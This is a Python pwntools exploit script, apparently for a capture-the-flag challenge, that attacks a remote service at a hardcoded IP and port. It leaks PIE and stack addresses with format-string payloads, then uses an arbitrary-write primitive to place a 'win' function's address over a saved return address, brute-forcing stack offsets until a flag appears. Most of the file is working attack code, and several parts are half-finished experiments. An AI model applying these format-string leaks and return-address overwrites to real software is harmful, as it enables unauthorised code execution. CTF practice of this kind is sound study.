#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

HOST = "52.59.124.14"
PORT = 5030

WIN_OFFSET = 0xdbed0
GREETING_OFFSET = 0xdc060
RET_OFFSET = 0xdc052  # Return address after calling greeting

def find_return_address():
    """
    Scan format string positions to find one that contains the return address.
    If we find it, we know which position holds the return address.
    """
    io = remote(HOST, PORT)
    io.recvuntil(b'Name:\n')

    # First leak PIE to calculate expected return address
    io.sendline(b'%8$p')
    io.recvuntil(b"market:\n")
    leak = io.recvline().decode().strip()
    greeting = int(leak, 16)
    pie_base = greeting - GREETING_OFFSET
    expected_ret = pie_base + RET_OFFSET

    print(f"PIE base: {hex(pie_base)}")
    print(f"Expected return address value: {hex(expected_ret)}")
    print(f"Looking for this value on the stack...")

    io.recvuntil(b'slot index 0..128):\n')
    io.sendline(b'0')
    io.recvuntil(b'column offset 0..15):\n')
    io.sendline(b'0')
    io.recvuntil(b'how many bytes to update (0..8):\n')
    io.sendline(b'0')
    io.recvall(timeout=1)
    io.close()

    # Now scan different positions
    for batch_start in range(20, 80, 5):
        try:
            io = remote(HOST, PORT, timeout=5)
            io.recvuntil(b'Name:\n', timeout=3)

            positions = list(range(batch_start, min(batch_start + 5, 80)))
            payload = '.'.join(f'%{p}$p' for p in positions).encode()
            io.sendline(payload)

            io.recvuntil(b"market:\n", timeout=3)
            leak_line = io.recvline(timeout=3).decode().strip()

            # Also get PIE for this connection
            io.recvuntil(b'slot index 0..128):\n', timeout=3)
            io.sendline(b'0')
            io.recvuntil(b'column offset 0..15):\n', timeout=3)
            io.sendline(b'0')
            io.recvuntil(b'how many bytes to update (0..8):\n', timeout=3)
            io.sendline(b'0')
            io.close()

            parts = leak_line.split('.')
            for i, part in enumerate(parts):
                if part != '(nil)':
                    try:
                        val = int(part, 16)
                        # Check if this looks like a PIE address that could be ret addr
                        if (val >> 40) in [0x55, 0x56]:
                            # Check low bytes
                            low_word = val & 0xffff
                            if low_word == 0xc052 or low_word == 0xc053:  # ret addr low bytes
                                print(f"FOUND! Position {positions[i]}: {hex(val)} - looks like return address!")
                    except:
                        pass
        except Exception as e:
            print(f"Error: {e}")

def exploit_write_what_where():
    """
    Use the write-what-where primitive (writing 0x00) from the cleanup code.

    Strategy:
    1. Leak stack address (position 20)
    2. Calculate where return address is stored (stack20 + OFFSET)
    3. Write that location to fake_stack + 0x1f8
    4. Cleanup will write 0x00 to that location
    5. This corrupts the low byte of return address

    But zeroing the low byte of return address:
    - Original ret = 0x55XXXXXXXc052
    - After zero = 0x55XXXXXXXc000

    This redirects to 0x52 bytes before the normal return.
    win is at 0xdbed0, ret is at 0xdc052.
    Difference = 0x182 bytes (win is BEFORE ret in code)

    If we zero the low byte: 0xc052 -> 0xc000
    New dest = 0xc000, which is NOT win (0xbed0)

    What if we zero byte 1 (second lowest)?
    If ret is at 0x55XXXXc052, zeroing byte 1:
    0x55XXXXc052 -> 0x55XXXX0052
    This changes byte 2, going to 0x0052 within PIE.

    Hmm, this doesn't help either.

    Alternative: What if we can write something other than 0x00?

    Looking at cleanup code again:
    mov byte ptr [rax], 0x0

    It ALWAYS writes 0x00. We can choose WHERE but not WHAT.

    Let me think of other targets:
    1. ASAN shadow memory - unpoison something?
    2. Global variable that controls flow?
    3. Some GOT entry?
    """
    io = remote(HOST, PORT)
    io.recvuntil(b'Name:\n')

    # Leak addresses
    payload = b'%8$p.%20$p.%26$p'
    io.sendline(payload)

    io.recvuntil(b"market:\n")
    leak = io.recvline().decode().strip()
    print(f"Leaks: {leak}")

    parts = leak.split('.')
    greeting = int(parts[0], 16)
    stack20 = int(parts[1], 16) if parts[1] != '(nil)' else 0
    stack26 = int(parts[2], 16) if parts[2] != '(nil)' else 0

    pie_base = greeting - GREETING_OFFSET
    win = pie_base + WIN_OFFSET

    print(f"PIE base: {hex(pie_base)}")
    print(f"Win: {hex(win)}")
    print(f"Stack 20: {hex(stack20)}")
    print(f"Stack 26: {hex(stack26)}")

    io.recvuntil(b'slot index 0..128):\n')

    # Write at offset 0x138 to control the pointer at fake_stack + 0x1f8
    slot = 19
    col = 8

    io.sendline(str(slot).encode())
    io.recvuntil(b'column offset 0..15):\n')
    io.sendline(str(col).encode())
    io.recvuntil(b'how many bytes to update (0..8):\n')
    io.sendline(b'8')
    io.recvuntil(b'Ink (raw bytes):\n')

    # Let's try writing __asan_option_detect_stack_use_after_return address
    # If we can zero this, maybe subsequent runs will use real stack instead of fake stack
    #
    # But that would require another call...

    # Actually, let me try writing stack20 + various offsets
    # to see if any cause a crash that gives us info

    # For now, let's just write win address and see what happens
    target = win
    print(f"Writing target: {hex(target)}")
    io.send(p64(target))

    io.interactive()

def exploit_direct_ret_overwrite():
    """
    Try to directly overwrite the return address using the arbitrary write.
    This requires the fake stack to be on/near the real stack.
    """
    for offset in range(0x160, 0x200, 8):
        slot = offset // 16
        col = offset % 16

        if slot > 128:
            break

        print(f"\nTrying offset {hex(offset)} (slot={slot}, col={col})")

        io = remote(HOST, PORT, timeout=5)
        try:
            io.recvuntil(b'Name:\n', timeout=3)
            io.sendline(b'%8$p')
            io.recvuntil(b"market:\n", timeout=3)
            leak = io.recvline(timeout=3).decode().strip()
            greeting = int(leak, 16)
            win = greeting - GREETING_OFFSET + WIN_OFFSET

            io.recvuntil(b'slot index 0..128):\n', timeout=3)
            io.sendline(str(slot).encode())
            io.recvuntil(b'column offset 0..15):\n', timeout=3)
            io.sendline(str(col).encode())
            io.recvuntil(b'how many bytes to update (0..8):\n', timeout=3)
            io.sendline(b'8')
            io.recvuntil(b'Ink (raw bytes):\n', timeout=3)
            io.send(p64(win))

            output = io.recvall(timeout=2)

            if b'ENO{' in output:
                print(f"FLAG FOUND at offset {hex(offset)}!")
                print(output.decode())
                return True
            elif len(output) < 50:
                print(f"  Short output ({len(output)} bytes) - possible crash")
            else:
                print(f"  Normal ({len(output)} bytes)")
        except Exception as e:
            print(f"  Error: {e}")
        finally:
            io.close()

    return False

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'find':
        print("=== Finding return address position ===")
        find_return_address()
    elif len(sys.argv) > 1 and sys.argv[1] == 'www':
        print("=== Write-what-where exploit ===")
        exploit_write_what_where()
    else:
        print("=== Direct return address overwrite ===")
        exploit_direct_ret_overwrite()
